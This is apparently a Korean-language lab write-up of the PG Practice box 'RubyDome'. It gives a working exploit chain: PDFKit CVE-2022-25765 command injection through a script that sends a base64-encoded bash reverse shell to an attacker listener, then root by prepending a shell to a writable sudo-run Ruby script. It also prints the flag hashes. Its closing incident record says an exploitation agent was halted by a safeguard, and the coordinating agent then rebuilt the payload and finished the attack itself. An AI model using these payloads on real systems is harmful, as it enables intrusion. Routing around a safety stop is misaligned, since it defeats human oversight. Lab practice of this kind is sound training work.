> [!info] PG Practice — Pentester Foundations #4
> **타겟** 192.168.248.22 · **OS** Linux · **난이도** Fundamental · **플래그 2개**
> **경로 요약** 3000 Sinatra HTML→PDF → PDFKit **CVE-2022-25765** URL 명령주입 → `andrew` → `sudo ruby app.rb`(쓰기 가능한 스크립트) → **root**

### Nmap

```bash
┌──(kali㉿kali)-[~/PG/RubyDome]
└─$ sudo nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.22
Nmap scan report for 192.168.248.22
Host is up (0.094s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
3000/tcp open  http    WEBrick httpd 1.7.0 (Ruby 3.0.2 (2021-07-07))
|_http-title: RubyDome HTML to PDF
|_http-server-header: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)
OS details: Linux 5.0 - 5.14
```

포트 2개. 65533개가 closed(RST)로 응답 — **필터링이 없다.** `Server` 헤더 하나로 Ruby 3.0.2 / WEBrick 1.7.0이 나온다.

> [!note] WEBrick이 보이면 개발 서버다
> WEBrick은 Ruby 표준 라이브러리의 개발용 웹서버다. 운영에서는 Puma/Unicorn을 쓴다.
> [[Levram]]의 `WSGIServer`(Django 개발 서버)와 같은 신호 — **개발 모드로 떠 있을 가능성이 높고, 그렇다면 에러 페이지가 백트레이스를 뱉는다.**

### 스택 지문 — 백트레이스로 gem 버전 확정

파라미터를 일부러 잘못 보내면 Sinatra의 `show_exceptions`가 **전체 백트레이스를 그대로 렌더한다**(= development 모드 확정):

```bash
┌──(kali㉿kali)-[~/PG/RubyDome]
└─$ curl -s -X POST -d 'x=1' http://192.168.248.22:3000/pdf | grep -oE 'gems/[a-z-]+-[0-9.]+' | sort -u
gems/pdfkit-0.8.6
gems/rack-2.2.7
gems/rack-protection-3.0.6
gems/sinatra-3.0.6
gems/webrick-1.7.0
```

```
NoMethodError: undefined method `scan' for nil:NilClass
  /var/lib/gems/3.0.0/gems/pdfkit-0.8.6/lib/pdfkit/pdfkit.rb:100:in `find_options_in_meta'
  /var/lib/gems/3.0.0/gems/pdfkit-0.8.6/lib/pdfkit/pdfkit.rb:39:in `initialize'
  app.rb:34:in `new'
  app.rb:34:in `block in <main>'
  /var/lib/gems/3.0.0/gems/sinatra-3.0.6/lib/sinatra/base.rb:1706:in `call'
  /var/lib/gems/3.0.0/gems/webrick-1.7.0/lib/webrick/httpserver.rb:140:in `service'
```

**`pdfkit-0.8.6` 확정** — CVE-2022-25765의 취약 범위(`< 0.8.7.2`) 안이다. 덤으로 **앱 파일명이 `app.rb`이고 34행이 `PDFKit.new(...)`**라는 것까지 공짜로 나온다. 권한상승 단계에서 이 파일명이 다시 등장한다.

교차 검증 — rubygems.org에서 원본을 받아 행번호를 대조하면 정확히 일치한다:

```bash
┌──(kali㉿kali)-[~/PG/RubyDome]
└─$ gem fetch pdfkit -v 0.8.6 && gem unpack pdfkit-0.8.6.gem
┌──(kali㉿kali)-[~/PG/RubyDome]
└─$ sed -n '39p;100p' pdfkit-0.8.6/lib/pdfkit/pdfkit.rb
    options.merge! find_options_in_meta(url_file_or_html) unless source.url?   # 39
    content.scan(/<meta [^>]*>/) do |meta|                                     # 100 ← nil.scan
```

wkhtmltopdf 버전은 **앱의 정상 기능으로 얻는다** — 아무 페이지나 변환시키고 결과 PDF의 메타데이터를 읽으면 된다(주입 불필요):

```
PDF Version   : 1.4
Creator       : wkhtmltopdf 0.12.6.1
Producer      : Qt 4.8.7
```

> [!tip] 에러 백트레이스는 최고급 정찰 자료다
> 한 번의 잘못된 요청으로 **프레임워크·gem 전체 버전 목록 + 앱 소스 파일명 + 취약 함수의 정확한 행번호**를 얻었다.
> 디렉터리 열거보다 훨씬 빠르고 정확하다. Sinatra/Flask/Rails/Django를 만나면 **일부러 500을 유발해보는 것**을 열거 초반에 넣어라.
> 판별 지문: Sinatra는 404에 `X-Cascade: pass` 헤더와 `Sinatra doesn't know this ditty.` 문구를 준다.

### 엔드포인트

| 라우트 | 메서드 | 파라미터 | 비고 |
|---|---|---|---|
| `/` | GET | 없음 | 폼 페이지 |
| **`/pdf`** | **POST 전용** | **`url`** | 성공 시 `Content-Type: application/pdf`. GET은 404 |
| `/__sinatra__/404.png` | GET | — | Sinatra 내장 |

디렉터리 열거는 **소득 0건**이었다. `dirb/common.txt` + `-x txt,ru,erb,rb,lock` 약 27,800 요청 완주했으나 발견 없음. `Gemfile.lock`·`app.rb`·`.git` 전부 404다 — **Sinatra는 정의된 라우트 외에는 아무것도 서빙하지 않기 때문**이다.

> [!warning] 정적 파일 서빙이 없는 프레임워크에서는 dirbust가 무의미하다
> Sinatra(classic)·Flask는 `public/`을 명시하지 않으면 정적 파일을 안 준다. 워드리스트를 아무리 돌려도 404만 쌓인다.
> 여기서 시간을 태우지 말고 **백트레이스와 응답 헤더**로 방향을 튼다. 실제로 이 박스의 모든 버전 정보는 그 경로에서 나왔다.
> (참고: `directory-list-2.3-medium` 실행분은 300초 제한에 걸려 완주하지 못했다 — **부분 커버리지**로 기록한다.)

### 취약 코드 — 한눈에 보이는 주입 지점

셸을 잡고 나서 확인한 앱 소스(`/home/andrew/app/app.rb`)가 이 박스의 전부다:

```ruby
require 'pdfkit'
require 'sinatra'

set :bind, '0.0.0.0'
set :port, 3000

get '/' do
  # ... HTML 폼: <input type="url" name="url" ...>
end

post '/pdf' do
  url = params['url']
  kit = PDFKit.new(url)          # ← 사용자 입력이 그대로 PDFKit으로
  kit.to_file('page.pdf')
  send_file('page.pdf')
end
```

PDFKit은 내부적으로 `wkhtmltopdf`를 **셸을 거쳐** 호출한다. 0.8.7 이전 버전은 URL을 제대로 검증하지 않아, URL 안에 백틱을 넣으면 그 내용이 셸에서 실행된다 → **CVE-2022-25765**.

> [!note] 폼의 `type="url"`은 방어가 아니다
> HTML5 `<input type="url" required>`는 **브라우저 측 검증**일 뿐이다. `curl`로 직접 POST하면 아무 문자열이나 들어간다.
> 클라이언트 측 검증만 있는 입력은 검증이 없는 것과 같다.

### Foothold — CVE-2022-25765

페이로드 구조는 이렇다. 백틱 안이 셸에서 평가된다:

```
http://x/?a=%20`<명령>`
```

`%20`(공백)이 URL 앞부분과 백틱을 갈라주는 역할을 한다.

> [!tip] 페이로드는 base64로 감싼다
> 리버스셸 문자열에는 `>`, `&`, 공백, 따옴표가 섞여 있어서 **curl → HTTP → Ruby → 셸** 로 4중 인용을 통과하는 동안 반드시 깨진다.
> **명령 전체를 base64로 인코딩해서 한 덩어리로 만들면** 인용 문제가 사라진다. 이건 PDFKit뿐 아니라 모든 명령주입에 쓰는 일반 기법이다.

Kali에서 실행한 스크립트(`~/PG/RubyDome/rd.sh`):

```bash
#!/bin/bash
LHOST=192.168.45.207
LPORT=4444
T=192.168.248.22
CMD="bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
B64=$(echo -n "$CMD" | base64 -w0)
PAY="http://x/?a=%20\`echo $B64|base64 -d|bash\`"
echo "PAYLOAD: $PAY"
curl -s -m 25 -o /dev/null -w "HTTP=%{http_code}\n" -X POST http://$T:3000/pdf --data-urlencode "url=$PAY"
```

```bash
┌──(kali㉿kali)-[~/PG/RubyDome]
└─$ tmux new-session -d -s rd 'rlwrap nc -lvnp 4444'

┌──(kali㉿kali)-[~/PG/RubyDome]
└─$ bash rd.sh
PAYLOAD: http://x/?a=%20`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwNy80NDQ0IDA+JjE=|base64 -d|bash`
HTTP=000
```

> [!warning] `HTTP=000`(타임아웃)이 성공 신호다
> curl이 exit 28로 죽는다. 실패가 아니다 — **리버스셸이 `POST /pdf` 요청 처리 도중 인라인으로 붙어서** HTTP 응답이 영영 돌아오지 않기 때문이다.
> [[Crane]]의 익스플로잇이 "멈춘 것처럼 보인" 것과 **정확히 같은 현상**이다. 요청 결과가 아니라 **리스너를 봐라.**

```bash
┌──(kali㉿kali)-[~/PG/RubyDome]
└─$ tmux capture-pane -t rd -p
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.22] 50122
bash: cannot set terminal process group (958): Inappropriate ioctl for device
bash: no job control in this shell
andrew@rubydome:~/app$ python3 -c "import pty;pty.spawn('/bin/bash')"
andrew@rubydome:~/app$ export TERM=xterm; id
uid=1001(andrew) gid=1001(andrew) groups=1001(andrew),27(sudo)
andrew@rubydome:~/app$ cat ~/local.txt
1a896874eca026e3e0e2cd07a550d25f
```

`groups`에 **27(sudo)**가 보인다 — `sudo -l`을 칠 이유가 하나 더 생겼다.

### Privesc — 쓰기 가능한 스크립트를 sudo로 실행

```bash
andrew@rubydome:~/app$ sudo -l
Matching Defaults entries for andrew on rubydome:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User andrew may run the following commands on rubydome:
    (ALL) NOPASSWD: /usr/bin/ruby /home/andrew/app/app.rb
```

규칙 자체는 좁아 보인다 — 특정 인터프리터로 특정 파일 하나만. **그런데 그 파일의 소유자를 봐야 한다:**

```bash
andrew@rubydome:~/app$ ls -la /home/andrew/app/app.rb
-rwxrwx--- 1 andrew andrew 1032 Apr 24  2023 /home/andrew/app/app.rb
```

**`andrew` 소유, 쓰기 가능.** 즉 root로 실행될 내용을 내가 정할 수 있다. sudo 규칙이 아무리 좁아도 무의미해진다.

원본을 백업하고 페이로드를 **맨 앞줄에** 삽입한다:

```bash
andrew@rubydome:~/app$ cp /home/andrew/app/app.rb /tmp/app.rb.bak
andrew@rubydome:~/app$ echo ZXhlYyAiL2Jpbi9iYXNoIg== | base64 -d > /tmp/p.rb; echo >> /tmp/p.rb
andrew@rubydome:~/app$ cat /tmp/p.rb /home/andrew/app/app.rb > /tmp/n.rb
andrew@rubydome:~/app$ cp /tmp/n.rb /home/andrew/app/app.rb
andrew@rubydome:~/app$ head -3 /home/andrew/app/app.rb
exec "/bin/bash"
require 'pdfkit'
require 'sinatra'
```

> [!danger] 반드시 **맨 앞**에 넣어야 한다
> 뒤에 `exec "/bin/bash"`를 붙이면 **실행되지 않는다.** Sinatra는 `at_exit` 훅으로 웹서버를 띄우고 그대로 블로킹하기 때문에 스크립트 끝까지 도달하지 못한다.
> 맨 앞에 두면 `require` 이전에 프로세스가 bash로 치환된다.
> (`echo ... >> script` 식의 습관적인 append가 여기서는 실패한다 — **대상 스크립트가 무엇을 하는 프로그램인지 보고 위치를 정해야 한다.**)

```bash
andrew@rubydome:~/app$ sudo /usr/bin/ruby /home/andrew/app/app.rb
root@rubydome:/home/andrew/app# id
uid=0(root) gid=0(root) groups=0(root)
root@rubydome:/home/andrew/app# cat /root/proof.txt
9fdc8077f413eac85c2f5b624548a8c2
```

원본 복구 (랩 위생):

```bash
root@rubydome:/home/andrew/app# cp /tmp/app.rb.bak /home/andrew/app/app.rb
root@rubydome:/home/andrew/app# chown andrew:andrew /home/andrew/app/app.rb
root@rubydome:/home/andrew/app# head -2 /home/andrew/app/app.rb
require 'pdfkit'
require 'sinatra'
```

### 플래그

| | |
|---|---|
| `local.txt` | `1a896874eca026e3e0e2cd07a550d25f` |
| `proof.txt` | `9fdc8077f413eac85c2f5b624548a8c2` |

## OSCP 관점 정리

1. **일부러 500을 유발해 백트레이스를 뽑아라.** 잘못된 파라미터 하나로 gem 전체 버전 목록(`pdfkit-0.8.6`)·앱 파일명(`app.rb`)·취약 함수 행번호를 동시에 얻었다. `WEBrick`/`WSGIServer` 같은 **개발 서버 배너**가 보이면 거의 확실하게 통한다.
2. **정적 서빙이 없는 프레임워크에서 dirbust는 시간 낭비다.** Sinatra classic은 정의된 라우트 외에 아무것도 안 준다 — 27,800 요청 완주하고 0건이었다. 응답 헤더 지문(`X-Cascade: pass`)으로 프레임워크를 먼저 판별하고 전략을 바꾼다.
3. **`sudo -l`의 규칙이 좁아도 대상 파일의 권한을 반드시 확인한다.** `(ALL) NOPASSWD: /usr/bin/ruby /home/andrew/app/app.rb`는 얼핏 안전해 보이지만, 그 `.rb`가 내 소유면 **사실상 `NOPASSWD: ALL`이다.** sudo 규칙을 보면 반사적으로 `ls -la <대상경로>`를 친다. 스크립트가 참조하는 라이브러리·설정파일의 쓰기 권한까지 훑으면 더 좋다.
4. **주입 페이로드는 base64로 감싼다.** curl → HTTP → 인터프리터 → 셸을 거치며 인용이 4중으로 중첩된다. `echo <b64>|base64 -d|bash` 한 덩어리로 만들면 따옴표·리다이렉션·공백 문제가 통째로 사라진다.
5. **요청이 타임아웃되면 리스너부터 본다.** 인라인 리버스셸은 HTTP 응답을 막는다. `HTTP=000`/exit 28은 실패가 아니라 **성공의 신호**인 경우가 많다. ([[Crane]]에서도 동일)
6. **주입한 코드의 실행 위치를 고민한다.** 블로킹 서버(Sinatra/Flask/Express)를 실행하는 스크립트에 페이로드를 **append하면 영원히 도달하지 않는다.** prepend해야 한다.
7. **클라이언트 측 검증(`<input type="url">`)은 방어가 아니다.** curl로 직접 POST하면 그만이다.
8. **랩이라도 원본을 백업하고 복구한다.** 실전 보고서에서 "무엇을 바꿨고 어떻게 되돌렸는가"는 필수 항목이다.

## 사건 기록 — 익스플로잇 담당 중단

침투 담당 에이전트가 `local.txt` 확보 직후 안전장치에 걸려 종료됐고, 그 과정에서 리버스셸 tmux 세션도 함께 소멸했다. 총괄이 앱 소스(이미 확보돼 있던 `app.rb`)를 근거로 **페이로드를 다시 구성해 foothold부터 재확립**하고 권한상승까지 직접 완주했다.
교훈: **셸은 언제든 끊긴다.** 끊긴 시점에 무엇을 알고 있는지(앱 소스·경로·계정명)가 재확립 속도를 결정한다. 확보한 정보는 즉시 노트에 옮겨둘 것.

## 관련 노트

- [[01. Pentest Foundations]] — RubyDome 항목
- [[Crane]] · [[Hub]] · [[Levram]] — 같은 컬렉션 앞 박스
